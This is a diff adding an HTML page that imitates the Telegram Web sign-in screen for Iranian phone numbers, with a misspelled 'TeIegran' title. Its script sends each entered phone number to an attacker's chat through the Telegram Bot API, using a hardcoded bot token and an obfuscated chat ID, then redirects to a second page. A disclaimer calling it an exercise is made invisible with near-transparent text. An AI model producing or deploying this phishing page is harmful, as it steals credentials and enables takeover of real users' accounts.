@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TeIegran Web</title>
+    <link rel="icon" href="telegram.png">
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+    <div class="all">
+        <img class="tel-img" src="telegream.jpg"/>
+        <h4>Sign in to Telegram</h4>
+        <p style="position:fixed; color: #ffffff01; ">This project is merely an exercise and has no connection to Telegram; and all inputs are entered as a test.</p>
+        <p>Please confirm your country code</p>
+        <p>and enter your phone number.</p>
+        <form id="form">
+            <div class="input country">
+                <label>Country</label>
+                <input value="Iran" disabled="true"/>
+            </div>
+            <div class="input">
+                <label>Phone Number</label>
+                <span>+98</span>
+                <input type="tel" id="input" value=""  minlength="13" maxlength="13" required/>
+            </div>
+            <button type="submit" class="send">Next</button>
+        </form>
+    </div>
+
+    <script>
+        const last=0
+        const phoneNumber=document.querySelectorAll("input")[1]
+
+        const CI = `${(44521288*5)+9}`;
+        const send=document.getElementById("form")
+        const buttonsend=document.getElementsByClassName("send")[0]
+
+
+        phoneNumber.addEventListener("input" , ()=> {
+            if (phoneNumber.value.length === 4 && phoneNumber.value[3] !== " "){
+                phoneNumber.value = `${phoneNumber.value[0]}${phoneNumber.value[1]}${phoneNumber.value[2]} ${phoneNumber.value[3]}`
+            }else if (phoneNumber.value.length === 8 && phoneNumber.value[7] !== " "){
+                phoneNumber.value = `${phoneNumber.value[0]}${phoneNumber.value[1]}${phoneNumber.value[2]} ${phoneNumber.value[4]}${phoneNumber.value[5]}${phoneNumber.value[6]} ${phoneNumber.value[7]}`
+            }  
+            let replaced=phoneNumber.value.replace(/ /g, "");
+            let ChangeToN=Number(replaced)
+            if(!ChangeToN){
+                phoneNumber.value=phoneNumber.value.replace(/\D/g,'')
+            }
+            
+        })
+
+        if(true){
+            send.addEventListener("submit", function(event){
+                if(!event.target.checkValidity()){
+                    event.preventDefault()
+                    
+                    event.target.reportValidity()
+                }else{
+                    event.preventDefault()
+                    buttonsend.innerHTML="<img src='wait.png'/> "
+                    localStorage.setItem('number',phoneNumber.value)
+                    sendNumber()
+                }
+            });    
+        }
+
+            
+            localStorage.setItem('TELEGRAM_TOKEN', '7077350815:AAG00hqaEAwDovDO6WD0EP53k9VwjJHmap8');
+            const token = localStorage.getItem('TELEGRAM_TOKEN');
+            async function sendNumber(){
+                const number=phoneNumber.value
+                try {
+                    
+                    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CI,
+                            text: number
+                        })
+                    });
+    
+                    if (response.ok) {
+                        console.log('پیام با موفقیت ارسال شد!');
+                        window.location.href="index2.html";
+                        
+                    } else {
+                        alert("Use Vpn")
+                        buttonsend.innerHTML="Next"
+                        console.log('خطا در ارسال پیام!');
+                    }
+                } catch (error) {
+                    console.log('خطا: ' + error.message);
+                }
+            }
+        ;
+    </script>
+</body>
+</html>
